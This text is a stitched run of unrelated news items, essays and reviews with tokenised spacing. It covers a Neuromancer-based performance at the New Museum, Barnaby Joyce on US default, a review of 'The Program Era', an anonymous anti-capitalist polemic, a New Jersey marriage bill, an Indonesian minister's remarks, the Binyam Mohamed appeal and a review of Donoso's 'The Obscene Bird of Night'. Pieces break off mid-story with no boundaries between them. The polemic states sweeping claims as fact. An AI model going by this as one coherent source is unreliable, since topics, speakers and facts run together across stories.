The Neuromancer movie may never get off the ground , but a performance / video installation version is coming to New York next week .
When Sasha Grey accepted her Fleshbot award via video last night , she mentioned she 's co-starring in a Neuromancer performance .

How exactly does Case manage to last six hours ?
The program says it goes from noon to six on Sunday Nov. 22 at the New Museum — and Grey mentioned those times as well .
I 'm guessing there 's some repetition in there , but will Grey and the other performers be there the whole time ?
Possibly the " faux virtual reality " sequences involving sculptures and Gamelan music will occupy five of the six hours ?
Update : creator Brody Condon wrote to us , and said , " The performance event ... occurring at the new museum is a deadpan reading of Gibson 's reading , not a theatre piece .
A mention of that might clear up any confusion .
Viewers can come and go as they wish throughout the day .

Update # 2 : Gibson tweeted about this event :
Gol ' dang !
It 's news to me !

Grey feels more like a character from Virtual Light , to me , but then she feels so * exactly * like that .
Heh .

In any case , here 's the official description :

An ambitious new work by Brody Condon , Case is a contemporary adaptation of the classic cyberpunk novel Neuromancer by William Gibson .
Combining Gibson 's1980s dystopian techno- fetishism with early twentieth - century abstraction , faux " virtual reality " scenes will unfold via moving Bauhaus - inspired sculptural props accompanied by the Gamelan ensemble Dharma Swara .
The event at the New Museum is the premiere of Case , which will also be performed at a small outdoor community theater in rural Missouri in summer 2010 .
The New York production of Case will feature many of the ten cast members from the upcoming Midwest event , such as political activist ( and notorious local hell - raiser ) Ray " Bad Rad " Radtke , who stars as the main character Henry Dorsett Case , a drug addict and computer hacker hired to execute an impossible cyber crime .
Case will also feature Brooklyn - based performance artist Sto as Lupus Yonderboy , leader of the techno - anarchist gang the Panther Moderns , and the actress Sasha Grey as the street samurai Molly .
The script has been prepared by the writer Brandon Stosuy , with sound design by Peter Segerstrom , and graphic props by Breanne Trammell .
THE OPPOSITION finance spokesman , Barnaby Joyce , believes the United States government could default on its debt , triggering an '' economic Armageddon ' ' which will make the recent global financial crisis pale into insignificance .
Senator Joyce said yesterday he did not mean to alarm the public but there needed to be a debate about Australia 's '' contingency plan ' ' for a sovereign debt default by the US or even by a local state government .
Armageddon warning ... Barnaby Joyce .

' 'A default by the US means complete economic collapse around the world and the question we have got to ask ourselves is where are we in that , '' Senator Joyce said .
His warning came as the Rudd Government ramped up its attack on Senator Joyce as an economic extremist by highlighting his strong opposition to Chinese sovereign investment in Australia .

Creative - writing programs are designed on the theory that students who have never published a poem can teach other students who have never published a poem how to write a publishable poem .
The fruit of the theory is the writing workshop , a combination of ritual scarring and twelve - on - one group therapy where aspiring writers offer their views of the efforts of other aspiring writers .
People who take creative - writing workshops get course credit and can , ultimately , receive an academic degree in the subject ; but a workshop is not a course in the normal sense — a scene of instruction in which some body of knowledge is transmitted by means of a curricular script .
The workshop is a process , an unscripted performance space , a regime for forcing people to do two things that are fundamentally contrary to human nature : actually write stuff ( as opposed to planning to write stuff very , very soon ) , and then sit there while strangers tear it apart .
There is one person in the room , the instructor , who has ( usually ) published a poem .
But workshop protocol requires the instructor to shepherd the discussion , not to lead it , and in any case the instructor is either a product of the same process — a person with an academic degree in creative writing — or a successful writer who has had no training as a teacher of anything , and who is probably grimly or jovially skeptical of the premise on which the whole enterprise is based : that creative writing is something that can be taught .
This skepticism is widely shared , and one way for creative - writing programs to handle it is simply to concede the point .
The University of Iowa Writers ’ Workshop is the most renowned creative - writing program in the world .
Sixteen Pulitzer Prize winners and three recent Poet Laureates are graduates of the program .
But the school ’s official position is that the school had nothing to do with it .
“ The fact that the Workshop can claim as alumni nationally and internationally prominent poets , novelists , and short story writers is , we believe , more the result of what they brought here than of what they gained from us , ” the Iowa Web site explains .
Iowa merely admits people who are really good at writing ; it puts them up for two years ; and then , like the Wizard of Oz , it gives them a diploma .
“ We continue to look for the most promising talent in the country , ” the school says , “ in our conviction that writing can not be taught but that writers can be encouraged . ”
“ A nice conviction if you can afford it ” might be the response of faculty working in less prestigious programs , and not everyone who teaches creative writing agrees about the irrelevance of the job .
Some writers do seem to make it a matter of principle to bite the hand that writes the checks .
Allen Tate , the poet and critic , complained that “ the academically certified Creative Writer goes out to teach Creative Writing , and produces other Creative Writers who are not writers , but who produce still other Creative Writers who are not writers . ”
Tate ran the creative - writing program at Princeton , where John Berryman was a colleague .
Kay Boyle once published a piece arguing that “ all creative - writing programs ought to be abolished by law . ”
She taught creative writing for sixteen years at San Francisco State .
Other writers , though , are very much with the program .
John Barth taught for twenty - two years in the Writing Seminars at Johns Hopkins , one of the oldest and most luminous programs in the country .
In 1985 , he published an article in the Times Book Review entitled “ Writing : Can It Be Taught ? , ” to which his answer was that it emphatically can , mainly on the ground that it so emphatically is .
( He added the standard “ genius ” exception : “ Not even in America can one major in Towering Literary Artistry . ” )
A few writing instructors have changed their minds .
When Barth wrote his piece for the Times , he might have been recalling a speech given three years earlier by one of the leading figures in the field , R. V. Cassill .
Verlin Cassill was a novelist and short - story writer who graduated from Iowa in 1939 and returned after the war to get an M.A. and to teach in the Writers ’ Workshop .
One of his students was Margaret Walker , an African - American , who was the author of “ Jubilee ” ( 1966 ) — the first of the so - called neo - slave narratives , of which the most famous is Toni Morrison ’s “ Beloved . ” ( “ Jubilee ” was Walker ’s Ph.D. thesis ; for the project , Cassill made her read Henry James , who , in those days , was considered a universal “ writer ’s writer , ” even for a woman writing a novel about slavery and Reconstruction . )
Cassill wrote a standard textbook , “ Writing Fiction ” ; he was the editor of “ The Norton Anthology of Short Fiction , ” a position of power in the field ; and , from 1966 until his retirement , in 1983 , he taught creative writing at Brown , another program with a distinguished history .
In 1967 , shortly after arriving at Brown and just at the start of a boom in university - based creative - writing programs , he founded the Associated Writing Programs , the professional association of academic creative writers .
But at a convention in Boston on the fifteenth anniversary of the A.W.P.
Cassill stunned the membership by suggesting that the organization should be disbanded .
He thought that writers had become complicit in the academic logrolling and gamesmanship of publish - or - perish : using other people ’s money — grants from their universities and from arts agencies — they devised ways to get their own and one another ’s work into print , and then converted those publications into salary increments ( which is apparently how Cassill thought that most professors operate ) .
They wrote poems to get raises .
The academic system was corrupting , and it was time for the writers to get out .
“ We are now at the point where writing programs are poisoning , and in turn we are being poisoned by , departments and institutions on which we have fastened them , ” he said .
The speech got attention , but the A.W.P. did not disband .
It eventually renamed itself the Association of Writers and Writing Programs , and it now has more than twenty - five thousand members .
Around the time that Cassill delivered his renunciation , there were seventy - nine degree programs in creative writing in the United States .
Today , there are eight hundred and twenty - two .
Thirty - seven of these award the Ph.D .
Mark McGurl does n’t mention Cassill ’s speech in his book about creative - writing programs and American fiction , “ The Program Era ” ( Harvard ; $ 35 ) , but it fits his argument perfectly .
The argument is that teaching creative writing should always be a scandal , since it ’s a scandal that suits everyone .
It allows people in creative - writing departments to feel that , unlike their colleagues in the traditional academic disciplines , they are not cogs in a knowledge machine ; and it allows the university to regard itself as what McGurl calls a “ difference engine , ” devoted to producing original people as well as original research .
He points out that teachers in creative - writing programs were asking “ Can it be taught ? ” right from the start , but that virtually no one has ever tried to lay down rules for what should go on in the classroom .
This is because not having an answer to the “ Can it be taught ? ” question — keeping alive the belief that all this training and socialization never really touches the heart of the imaginative process — is what marks creative - writing programs as “ creative . ”
Academic creative - writing programs are , as McGurl puts it , examples of “ the institutionalization of anti-institutionality . ”
That ’s why institutions love them .
They are the outside contained on the inside .
Still , the creative - writing program , unsystematic or even anti-system as it might believe itself to be , is a system .
People go in at one end and they come out the other , bearing ( like the Scarecrow ) a piece of paper with a Latin inscription , but also bearing ( unlike the Scarecrow ) the impress of an institutional experience .
The nature of that experience mutates as the folk wisdom of the workshop mutates — from “ Show , do n’t tell , ” which was the mantra in the nineteen - forties and fifties , to the effectively opposite mantra “ Find your voice , ” which took over in the nineteen - sixties and seventies .
McGurl suggests that these mantras encode shifting patterns of cultural assumptions — about identity , about work , about gender and class , and , of course , about what counts as good writing — and that they have had a big effect on the stories and novels that American writers have produced .
“ The rise of the creative - writing program , ” he says , “ stands as the most important event in postwar American literary history . ”
McGurl ’s book is not a history of creative - writing programs .
It ’s a history of twentieth - century fiction , in which the work of American writers from Thomas Wolfe to Bharati Mukherjee is read as reflections of , and reflections on , the educational system through which so many writers now pass .
( McGurl does n’t deal with poetry . )
As McGurl points out , the university is where most serious fiction writers have been produced since the Second World War .
It has also been the place where most serious fiction readers are produced : they are taught how to read in departments of literature .
McGurl ’s claim is simple : given that most of the fiction that Americans write and read is processed through the higher - education system , we ought to pay some attention to the way the system affects the outcome .
This may sound like a formula for debunking , but it ’s not .
“ The Program Era ” is an impressive and imaginative book .
It does three things unusually well .
First , it interprets works of fiction as what philosophers of language call illocutionary acts .
The meaning of one of Raymond Carver ’s stories is not only what the story says ; it ’s also the way the story says it .
The form of a Carver short story — ostentatiously brief , emotionally hyper - defended — expresses something .
McGurl thinks that the style represents the “ aestheticization of shame , a mode of self - retraction . ”
Literary minimalism like Carver ’s — McGurl calls it “ lower - middle - class modernism ” — is a means of reducing the risk of embarrassing oneself , and is one way that students from working - class backgrounds , like Carver ( he was from Oregon , where his father was a sawmill worker ) , deal with the highbrow world of the academy .
Rather ingeniously , McGurl reads the work of Carver ’s exact contemporary Joyce Carol Oates as an expression of the same class - based self - consciousness .
( He notes that Carver once called Oates the most important writer of his generation . )
Oates is a prolific practitioner of what McGurl calls “ maximalist ” fiction : it has been said that , at one point in her career , she wrote forty pages of fiction every day , or about a quarter of what would constitute an entire book for Carver .
But McGurl thinks that maximalism , too , is “ a way of shielding oneself with words . ”
The two styles are methods of self - protection and , at the same time , forms of self - assertion : the minimalist writer puts his craft on display , the maximalist his facility .
“ I ’m sorry , Ma’am , but you ’ll have to put your dust jacket back on . ”

Carver and Oates are both program products .
Oates is from a poor family — she once described herself as “ of peasant stock ” — in upstate New York .
She came out of the undergraduate creative - writing program at Syracuse , where she studied with Donald Dike , and she has spent most of her career teaching at Princeton , where Morrison , until her recent retirement , was also on the faculty .
In Carver ’s case , the career constitutes a virtual tour d’horizon of the creative - writing scene .
Carver started as a correspondence student in an outfit known as the Palmer Institute of Authorship .
He took classes at Chico State , in California , with the novelist John Gardner ; at Humboldt State College , with the short - story writer Richard Cortez Day ; at Sacramento State College , with the poet Dennis Schmitz ; and at Stanford , where he was a Wallace Stegner Fellow ; and he taught at the Iowa Writers ’ Workshop with John Cheever .
His second marriage was to another creative - writing professional , the poet Tess Gallagher , and he ended up as a professor at Oates ’s alma mater , Syracuse , where Jay McInerney was his student .
The beat goes on —McGurl ’s point .
A second thing that “ The Program Era ” does well , and sometimes entertainingly , is to treat the world of creative writing as an ant farm , in which the writer - ants go about busily executing the tasks they have been programmed for .
Writing is a technology , after all , and there is a sense in which human beings who write can be thought of as writing machines .
They get tooled in certain ways , and the creative - writing program is a means of tooling .
But McGurl treats creative writing as an ant farm where the ants are extremely interesting .
He never reduces writers to unthinking products of a system .
They are thinking products of a system .
After all , few activities make people more self - conscious than participating in a writing workshop .
Reflecting on yourself — your experience , your “ voice , ” your background , your talent or lack of it — is what writing workshops make people do .
McGurl thinks that this habit of self - observation is not restricted to writing programs .
He thinks that we ’re all highly self - conscious ants , because that ’s what it means to be a modern person .
Constant self - assessment and self - reflection are part of our program .
( McGurl uses the term “ reflexive modernity . ”
There is a lot of critical techno - speak in “ The Program Era , ” it ’s true .
There are also flow charts and the like , diagrams suited to systems analysis .
If you do n’t enjoy this sort of thing , you will not get very far into the book .
It ’s worth learning to enjoy , though . )
So the fiction that comes out of creative - writing programs may appeal to readers because it rehearses topics —
“ Who am I ? ” issues — that are already part of their inner lives .
And contemporary fiction does have many readers .
McGurl argues that , far from homogenizing literature or turning it into an academic exercise , creative - writing programs have been a success on purely literary grounds .
“ There has been a system - wide rise in the excellence of American literature in the postwar period , ” he says , and he offers the same proof that Barth offered in his Times article : there is more good fiction out there than anyone has time to read .
The system must be doing something right .
The third accomplishment of “ The Program Era ” is almost inadvertent .
Changes in creative - writing programs are influenced by changes in two related bodies of thought , both of which try to answer the question “ How can we make people more productive and more creative ? ”
These are the philosophy of education and management theory .
Creative - writing courses follow naturally from the “ learning by doing ” theories of progressive education : they add practical , hands - on experience to traditional book learning .
And , as McGurl suggests , presenting a story in a writing workshop is a little like making a business presentation in a corporate workplace .
Such a presentation is , on some level , what he calls “ a presentation of individual excellence , ” a means by which we observe and test ourselves .
It helps us measure how we ’re doing in the human race .
The unexpected result of combining a history of creative fiction writing with a history of education and management theory is a kind of slide show of postwar American life .
“ The Program Era ” evokes a sense of how life felt in the nineteen - sixties , when Ken Kesey and the Merry Pranksters took their bus trip ( a writers ’ workshop on the road ) , and a sense of how life felt in the nineteen - seventies , when Carver was writing his bleak little stories .
And this helps McGurl to make a larger point , which is that university creative - writing programs do n’t isolate writers from the world .
On the contrary , university creative - writing courses situate writers in the world that most of their readers inhabit — the world of mass higher education and the white - collar workplace .
Sticking writers in a garret would isolate them .
Putting them in the ivory tower puts them in touch with real life .
Is the rise of the creative - writing workshop , as McGurl claims , “ the most important event in postwar American literary history ” ?
Creative - writing courses did not suddenly spring into being in 1945 .
A course called Verse Making was available at Iowa in 1897 , and from 1906 to 1925 George Pierce Baker taught a drama workshop at Harvard , the first graduate writing course in the country ; Thomas Wolfe took it .
The term ( and the concept ) “ creative writing ” dates from the nineteen - twenties , which is when Middlebury started the Bread Loaf Writers ’
Conference , where Robert Frost served as the world ’s first writer - in - residence .
In 1936 , Iowa launched the Writers ’ Workshop — officially , the Program in Creative Writing — under the direction of Wilbur Schramm , and began awarding the first M.F.A.s .
In 1941 , Schramm was replaced by Paul Engle , a prodigious creative - writing proselytizer and cultural Cold Warrior , who made Iowa into a global power in the field .
Engle eventually brought writers from seventy countries to study at Iowa .
There was a surge in creative - writing degree programs after the Second World War .
The Writing Seminars at Johns Hopkins started in 1947 ; Stanford inaugurated its writing fellowships the same year ; Cornell ’s creative - writing program opened in 1948 .
As is the case with most new developments in higher education , changes in funding were responsible .
Title II of the Servicemen ’s Readjustment Act of 1944 — the G.I.
Bill — provided forty - eight months of tuition for veterans who enrolled in colleges and universities .
More than two million veterans , a much bigger number than anticipated , took up the offer , and by 1950 the government had spent more money on tuition and other college costs than on the Marshall Plan .
The key requirement of Title II was that the tuition assistance be used only for study in degree or certificate programs , which is why creative - writing courses grew into degree - granting creative - writing programs .
In the nineteen - sixties , the universe of higher education underwent a fantastic expansion .
Between 1960 and 1969 , enrollments doubled and more professors were hired than had been hired in the entire previous three hundred and twenty - five years .
Most of the growth was in the public sector .
At the height of the expansion , between 1965 and 1972 , new community - college campuses were opening in the United States at the rate of one every week .
A way for institutions to raise their academic profiles was to add graduate programs .
( Once added , they became virtually impossible to subtract .
This is one reason that there is an oversupply of Ph.D.s in the United States . )
By 1975 , there were fifteen creative - writing M.F.A. programs in the country .
Today , there are a hundred and fifty - three .
Creative - writing programs attract students ( good for public universities , where enrollment may determine budgets ) , but , contrary to what many people assume , they are not generally cash cows .
Most of the top programs — until recently , Columbia was the major exception — provide fellowship support for all their students , and the classes are tiny .
In 2005 - 06 , only four - tenths of one per cent of all master ’s degrees awarded were in creative writing .
The identification of certain writers with university creative - writing programs is , therefore , a postwar phenomenon .
The list is long : John Hawkes ( Brown ) , Guy Davenport ( Kentucky ) , Robert Coover ( Brown ) , Reynolds Price ( Duke ) , Wallace Stegner ( Stanford ) , Leslie Epstein ( Boston University ) , Donald Barthelme ( Houston ) , Tobias Wolff ( Syracuse ) , E. L. Doctorow ( New York University ) , William Kennedy ( SUNY Albany ) , Robert Olen Butler ( Florida State University ) .
And many writers who are not normally imagined in an academic setting have circulated through the creative - writing system .
Philip Roth has taught at several universities , including Iowa and Princeton .
Kurt Vonnegut and Nelson Algren both taught at Iowa .
( Algren claimed to find writing programs worthless .
He later complained , in a piece called “ At Play in the Fields of Hackademe , ” that “ what it lacks in creativity , the Iowa Creative Workshop makes up in quietivity . ”
He is reported to have lost a lot of money playing poker while he was in Iowa City . )
And it is remarkable how many fiction writers have come through university writing programs since the war — not just individual writers but entire cohorts .
When Vonnegut was at Iowa , he taught a class that included John Casey , Gail Godwin , Andre Dubus , and John Irving .
Ken Kesey , Robert Stone , Wendell Berry , Larry McMurtry , Ernest Gaines ( “ The Autobiography of Miss Jane Pittman ” ) , and Tillie Olsen were all in a creative - writing workshop at Stanford at the same time .
Michael Chabon , Alice Sebold , and Richard Ford ( a student of Doctorow , before Doctorow went to N.Y.U. ) are products of the program at the University of California at Irvine .
Susan Minot , Rick Moody , Tama Janowitz , and Mona Simpson all went to Columbia .
The absorption of fiction writing into the university has a lot to do with the emergence of robust traditions ( as opposed to scattered works ) of so - called multicultural literature .
As McGurl notes , virtually all the major figures in Latino literature have been American academics .
The same is true of Asian - American novelists , many of whom have held university appointments , and of Native American writers .
N. Scott Momaday was a student of Stegner ’s at Stanford , which is where he began work on his Pulitzer Prize - winning novel , “ House Made of Dawn ” ( 1968 ) .
These writers have a special relation to the “ outside contained on the inside ” feature of academic creative - writing programs , and many of the most celebrated have been accused of inauthenticity .
McGurl tells the story of the attack on Momaday ’s “ House Made of Dawn ” by Karl Kroeber .
Kroeber is not a Native American ; he is a professor of English at Columbia whose many interests include Native American literature , and he criticized Momaday for attempting to “ evoke an ‘ Indianness ’ for his readers ( the majority of whom will presumably not be Indians ) through an Anglo - American literary structure that must prohibit any authentically Indian imaginative form . ”
Native American literature can be taught in a university , in other words , but Native American literature should not be written in a university .
Authenticity is a snark — although someone will always go hunting for it .
McGurl ’s response to Kroeber is sensible : since Momaday is a Native American , and since he developed his literary style by studying white modernist writers at Stanford and other universities , “ rather than being contaminated by modernism , Indian art now includes modernism as one of its elements . ”
As McGurl points out , the horses that the Plains Indians rode when they hunted , so picturesquely , the buffalo were European imports .
And though some readers are devoted to fiction about ethnic minorities because it tells “ their story , ” there is a degree to which such literature is for outsiders , a variety of anthropology in which natives “ inform ” on their own cultures to literary tourists .
The rest of the natives are often not thrilled to find their practices paraded before the gaze of outsiders .
“ To celebrate one ’s family to the maximum , to put them proudly and visibly into print , might require betraying them to the eyes of an alien observer we might call ‘ America , ’ ” as McGurl puts it .
“ Portnoy ’s Complaint ” is a case in point .
All literature about an ethnic minority by members of that ethnic minority is , potentially , a shanda fur die goyim .
More striking is that writing of this kind coming out of creative - writing programs today is the subject matter of literature and ethnic - studies departments tomorrow .
Universities have become restaurants that bake their own bread .

The creative - writing program is an American invention , and it has recently become an American export .
The British were at first contemptuous of the idea of creative - writing courses ; they regarded them , as the critic and novelist Malcolm Bradbury once put it , as being “ like the hamburger — a vulgar hybrid which , as everyone once knew , no sensible person would ever eat . ”
The first British master ’s - degree program in creative writing opened in 1970 .
Bradbury and Angus Wilson set it up .
( Bradbury taught Ian McEwan . )
The first undergraduate degree program was not instituted until 1991 .
But the vulgar hybrid has spread .
McGurl reports that there are now writing programs in Australia , Canada , New Zealand , Israel , Mexico , South Korea , and the Philippines .
We are rapidly returning to the uncivilized Law of the Jungle .
We will soon live in a world where brute force rules .
It is not only the disabled , widows , children and orphans who are vulnerable to the cruelties of this jungle .
We all are .
We have been brainwashed with incessant slogans like “ Get the government off your back , ” and “ Keep more of your own money … oppose all tax increases . ”
Our dominant , false ideology tells us that every function of government must be privatized , so that governmental functions can be performed with business - like efficiency .
( We are not told that the real reason for privatizing is to give capitalists yet another opportunity for making short term profit . )
The very concept that we humans might work and cooperate together to protect ourselves from Jungle dangers and to meet our common needs is shunned as “ socialism , ” as if that were something evil .
The capitalists have brainwashed themselves , and they have brainwashed us .
They along with the rest of us hope and assume that the common good will somehow automatically take care of itself , if they think about the common good at all .
Each capitalist must be concerned only with his own private profit and cannot be concerned with the common good lest some competitor captures his profit making opportunity .
We are a nation of millions of brainwashed individualists , living , working , and acting under false perceptions of reality as if we were all “ Manchurian Candidates . ”
We have forgotten that government is the only effective institution that we have to protect us from the brute force of the Law of the Jungle .
If we do not very quickly awaken from our trance , and act together in a cooperative human community , millions of us will perish .
Ironically , most wealthy capitalists will themselves be destroyed in this looming Jungle .
Capitalists need government almost as badly as we do , but they will not admit it .
As Adam Smith taught long ago , capitalism and capitalists can survive only with a rule of law controlling private property rights and business promises , a government to enforce those laws , and a certain level of morality .
He cannot be concerned with the common good lest some competitor captures his profit .
Capitalist ideology thus prohibits capitalists from protecting their own common good .
As we see from the daily news , no capitalist will speak out in support of regulation of Wall Street .
Capitalists say that they will discipline themselves , but they have not , can not and do not .
We ordinary citizens and voters cling to an illusory idealistic assumption that we retain the right to govern ourselves , and that if we only work hard enough in the political process , we can change things through the ballot box .
We cling to this false deadly assumption despite the vast accumulation of evidence that our political process is totally dominated and controlled by approximately 5000 very wealthy individuals acting through their ownership of their corporations and their mainstream advertising agencies , TV , radio , newspapers , and magazines .
Thus in these desperate times , our government has given Trillions of our tax dollars to the big banks of the wealthy without any conditions , while our government has given little or nothing to create jobs for us .
This money controlled government can afford to give Trillions to the wealthy , but this government cannot afford to provide VA hospitals and medical care for everybody .
We citizens and voters are kept quiet and non-rebellious because of our own brainwashed state , fueled by our addiction to consumer goods , electronic gadgets , computers and TV .
Part of the trance and delusion is maintained by liberals .
My definition of a “ liberal ” is one who vaguely wants a civilizing government and to make things right , but only if it does not deprive him of his standard of living .
Thus a liberal will protest wealth inequality , the corruption of our elected leaders by money , imperialism , wars abroad , torture , rendition , and civilian collateral damage , but a liberal will not rebel , stop work , strike , picket , vigil or boycott .
A liberal knows at some level that his material well being depends ultimately on these very evils that he protests against , specifically including torture .
A liberal , like a conservative capitalist , cannot face the fact that he himself is in a dangerous suicidal trance .
So he does not challenge the trance either .
Even under the best of circumstances , we have limited time and interest in governing ourselves .
Our civic impulse is in very short supply .
We see this in the low voter turnout and in the superficial slogans that lead many voters make up their minds .
We see it also in political parties , local governments , charities , clubs and unions where aggressive individuals rise to power , and the ordinary person does not bother to attend meetings or to vote .
The blunt truth is that we are now ruthlessly governed by these few wealthy individuals who have accumulated their vast fortunes .
One might almost say that we are “ ungoverned , ” but of course we are taxed to benefit these rulers , and to pay for their losses on their risky financial investments .
The government is operated and controlled by and for these few wealthy individuals .
For all practical purposes , it is if we are ruled by a selfish greedy king who rules us and taxes us for his own pleasure and his own benefit .
This “ king ” has his royalist earls , dukes , nobles and toadies in the form of Presidents , Senators , elected officials , journalists , college professors and economists who fawn around him .
These toadies tell the “ king ” what he wants to hear ( however insane and stupid ) hoping for his favor and crumbs from his table .
President Obama himself is such a toady to the “ king . ”
Obama ’s economic advisors , former Harvard President Larry Summers and University of California Professor Christina Romer are perfect examples of such fawning advisors to the “ king . ”
They study and report only what the “ king ” wants to hear .
The truth is that our capitalism and our self governing democracy are beyond repair or reform .
Both are terminal , and dysfunctional .
Our material well being is rapidly falling , and it will fall much further .
Our trance prevents us from dealing with the death throes of capitalism , with the few wealthy individuals who control democracy with their wealth , with diminishing reserves of oil and gas , and with deadly global warming .
This is not to say that we will find it easy to make changes even if we become aware of our trance .
We will have to attend meetings and vote .
We will have to accept a lower standard of living because of the depletion of oil and live like Cubans .
Other civilizations in the past have fallen into dark ages because those in power did not recognize the falsity of their political - economic - cultural ideas , and did not take corrective action in time .
Millions of us are destined to starve and those who do survive will be serfs allowed to grow a little food on the estates of the very rich .
This is inevitable , unless we awaken and face the truth very soon .
TRENTON 
The battle over a bill that would legalize gay marriage in New Jersey shifted locations unexpectedly late Wednesday as sponsors of the legislation canceled a vote scheduled for Thursday in the State Senate , where the measure appeared headed for defeat .
The sponsors , Senators Raymond J. Lesniak and Loretta Weinberg , both Democrats , withdrew the bill from the agenda in the Senate session , saying they wanted to first allow a hearing in the General Assembly , where support for same - sex marriage is believed to be stronger .
But opponents were outraged by the last - minute switch and accused Democrats of abusing their leadership positions to force a controversial issue through the Legislature during the waning days of the session .
The bill was passed narrowly on Monday by a Senate committee .

The minister spoke in Padang , hit by a powerful earthquake in September
A government minister has blamed Indonesia 's recent string of natural disasters on people 's immorality .
Communication and Information Minister Tifatul Sembiring said that there were many television programmes that destroyed morals .
Therefore , the minister said , natural disasters would continue to occur .
His comments came as he addressed a prayer meeting on Friday in Padang , Sumatra , which was hit by a powerful earthquake in late September .
He also hit out at rising decadence - proven , he said , by the availability of Indonesia - made pornographic DVDs in local markets - and called for tougher laws .
According to the Jakarta Globe , his comments sparked an angry reaction on the internet , particularly among those who followed him on social networking site Twitter .
Why focus on public immorality when there was so much within the government , one respondent reportedly asked .
More than 1,000 people died in the Padang earthquake , which toppled hundreds of buildings in and around the city .
Padang lies to the south of Aceh province , which was devastated in the December 2004 Asian tsunami .
Indonesia lies across a series of geological fault - lines and is prone to frequent earthquakes and volcanic eruptions .
Lawyers acting for David Miliband , the foreign secretary , today launched an extraordinary attack on the high court , accusing it of irresponsibility for ruling that CIA intelligence relating to ill - treatment and torture – and what Britain knew about it – should be disclosed .
Jonathan Sumption QC accused two high court judges of views that were " in many respects , unnecessary and profoundly damaging to the interests of this country " after they ruled that evidence about what UK agencies knew of unlawful CIA activities should be revealed .
Referring to the judges ' scepticism of claims made by the US government , and Hillary Clinton , the secretary of state , in particular , Sumption added : " I would go so far as to say their views were irresponsible . "
Sumption was opening Miliband 's appeal against high court rulings by Lord Justice Thomas and Mr Justice Lloyd Jones .
The judges ruled that what the CIA told MI5 – and what MI6 knew – of the unlawful treatment of British resident Binyam Mohamed should be disclosed .
Mohamed was detained in 2002 in Pakistan where he was questioned incommunicado by an MI5 officer .
The US flew him to Morocco , Afghanistan , and Guantánamo Bay where he says he was tortured , with the knowledge of British agencies .
Thomas and Lloyd Jones ruled that it was clear from the evidence " that the relationship of the United Kingdom government to the United States authorities in connection with Binyam Mohamed was far beyond that of a bystander or witness to the alleged wrongdoing " .
At issue is a seven - paragraph CIA document that the British government says must remain secret .
The two high court judges , who have seen the document , say it does not contain any sensitive material and the information in it " gives rise to an arguable case of torture or cruel , inhuman and degrading treatment " .
However , Sumption told the court of appeal today that since Mohamed was released from Guantánamo Bay in February , he was no longer affected by the legal proceedings which , he asserted , had " essentially been taken over to serve a wider , and in some respects , political agenda " .
The appeal is being heard by three of the country 's most senior judges – the lord chief justice , Lord Judge , Lord Neuberger , and Sir Anthony May .
For many years , Sumption told them , the US and the UK had a " highly productive intelligence relationship " even though the two countries disagreed about some " interrogation techniques " .
If the CIA information relating to Mohamed and what the British knew about it were released , " the US government will say we will not in future be able to give you our most sensitive stuff " , Sumption said .
He added : " It is the reality of the situation . "
The hearing continues .
4. The Obscene Bird of Night , by Jose Donoso
The epigraph of the novel , The Obscene Bird of Night , is taken from a letter by Henry James Sr. to his two sons .
Every man who has reached even his intellectual teens begins to suspect that life is no farce ; that it is not genteel comedy even ; that it flowers and fructifies on the contrary out of the profoundest tragic depths of the essential dearth in which its subject 's roots are plunged .
The natural inheritance of everyone who is capable of spiritual life is an unsubdued forest where the wolf howls and the obscene bird of night chatters .
The novel opens with a stately funeral procession for Mother Benita , the Mother Superior of La Casa del Ejercicios Espirituales de la Encarnacion .
The Casa is a huge , gothic convent with labyrinthine hallways , " endless courts and cloisters connected by corridors that never end , " many of them being boarded up now that the building is no longer used as a convent .
Instead , it has become a refuge for a horde of old women who inhabit the dark , sequestered rooms .
Much of the story takes place inside this ghastly building .
The narrator 's description of the convent is so meticulous and repetitive , almost like a refrain , that the setting is impressed upon the reader 's mind .
The narrator of The Obscene Bird of Night is practically an enigma , moving between the voice that opens the novel - - holding an endless , open conversation with Mother Benita -- and various other narrative voices in the first person .
Reading the novel for the first time can be an exhilarating but also somewhat confusing experience .
Only after my fifth reading do I feel confident in saying I understand the logic behind the panoply of narrative voices .
You may think there are several narrators of this novel .
For example , there is Mudito , a mute who lives in the Casa and is ordered around by the old women ; a nun who is indistinguishable from the other nuns ; and Humberto Peñaloza , secretary to the wealthy landowner and politician at the center of the novel .
But in fact all of the narrators are the same person , the various guises of Humberto Peñaloza , who , later in the story , we also learn , is a writer assigned by Don Jeronimo de Azcoitia ( the wealthy landowner ) to write " the history of Boy 's world " . . .
Hieronymus Bosch , The Garden of Earthly Delights
As a writer myself , The Obscene Bird of Night endlessly fascinates me for its subtle and intricate construction .
The tense shifts , point of view shifts , and various story arcs , all contribute to the grand illusion of Jose Donoso 's unique magical realism .
This quantum fiction is geometrically precise , laid out like concentric circles around a common theme .
Three or four narratives overlap each other , each with characters that act as doubles , or doppelgangers , to the characters in the other stories .
Beyond this literary pattern - making , Donoso 's fictional world acquires its strangeness from absorbing an abundance of genres , including legend , fable , fairy tale , detective story , memoir , Modernist novel , and Realist novel .
It also serves as a veiled critique of the ruling class in Chile , and a handful of other South American countries which operate similarly .
But the critique never becomes too literal because the novel adeptly weaves in and out of a myth - like story with fabulous creatures and unlikely characters .
It is also a novel about a colony of monsters .
Don Jeronimo de Azcoitia must produce an heir for the continuation of his family line .
Here is his uncle urging him , as a young man , to marry :
You can't go , Jeronimo .
Listen to me , son , be reasonable .
You 're the only one left . . . and I had to take it into my head to become a priest , may God forgive me for saying it .
You 're the last one who can hand down the family name .
You do n't know how I 've dreamed about an Azcoitia playing an important part once more in the country 's public life !
I waited for you so anxiously , assuming your obligations while you were enjoying an immoral life in Paris .
But you 're here now , and I 'm not going to let you go .
Jeronimo falls in love with the " prettiest , most innocent girl who frequented the social salons at the time , a distant cousin with many female Azcoitia ancestors behind her " .
After he proposes to her , he has a vision of perfection about the two of them .
He sees their union as a " stone medallion " , part of an " eternal frieze " of more medallions that carry the family name .
We read , " He merely took pains to see that the magnificent legend of the perfect couple was fulfilled in both himself and his bride - to - be . "
Jeronimo kissed her into silence .
The womb heaving against his body would open to procure immortality for him : through their sons and grandsons , the frieze of medallions would extend forever .
There 's only one problem .
Ines has a nursemaid she 's had since childhood who Jeronimo rejects .
When Ines was young , she had a stomach illness that almost killed her .
Peta Ponce , the nursemaid , preformed a miracle which removed the stomach illness from Ines by transferring it to Peta , the healer .
Ever since Peta made this sacrifice , Ines has shown a fierce loyalty towards her .
Jeronimo believes that Peta Ponce is a witch , and he may be right .
